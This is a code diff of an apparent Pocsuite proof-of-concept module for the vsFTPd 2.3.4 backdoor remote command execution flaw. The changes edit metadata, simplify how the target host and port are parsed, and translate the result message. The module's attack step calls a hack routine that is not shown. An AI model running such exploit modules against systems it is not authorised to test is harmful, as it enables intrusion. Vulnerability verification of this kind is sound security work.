@@ -10,15 +10,15 @@ port = 21
 
 
 class TestPOC(POCBase):
-    vulID = '71851'
-    version = '1.0'
+    vulID = '00234'
+    version = '1'
     author = 'Antiy'
-    vulDate = '2014-07-01'
+    vulDate = '2011-06-30'
     createDate = '2022-10-28'
     updateDate = '2022-10-28'
     references = ['OSVDB (73573)', 'http://pastebin.com/AetT9sS5', 'http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html']
     name = 'vsFTPd 2.3.4 BackDoor'
-    appPowerLink = 'http://vsftpd.beasts.org/'
+    appPowerLink = ''
     appName = 'vsFTPd'
     appVersion = '2.3.4'
     vulType = 'RCE'
@@ -27,36 +27,22 @@ class TestPOC(POCBase):
     defaultPorts = [21]
     defaultService = ['vsftpd 2.3.4', 'vsftpd', 'ftp']
 
-    def parse_target(self, target, default_port):
-        schema = 'http'
-        port = default_port
-        address = ''
-        if '://' in target:
-            slices = target.split('://')
-            schema = slices[0]
-            target = slices[1]
-        if ':' in target:
-            slices = target.split(':')
-            address = slices[0]
-            port = slices[1]
-        else:
-            address = target
-        return {'schema': schema, 'address': address, 'port': int(port)}
-
     def _attack(self):
         return self._verify()
 
     def _verify(self):
         result = {}
         try:
-            target = self.parse_target(self.target, 21)
-            target_ip = target['address']
-            target_port = target['port']
+            target_ip = self.target.split(':')[0].strip('/')
+            if len(self.target.split(':')) > 1:
+                target_port = int(self.target.split(':')[1].strip('/'))
+            else:
+                target_port = 21
 
             data = self.hack(target_ip, target_port)
             if data:
                 result['VerifyInfo'] = data
-                result['VerifyInfo']['URL'] = '%s:%i Backdoor Command Execution' % (target_ip, target_port)
+                result['VerifyInfo']['URL'] = '%s:%i存在后门漏洞' % (target_ip, target_port)
         except Exception as e:
             print e
             result = {}
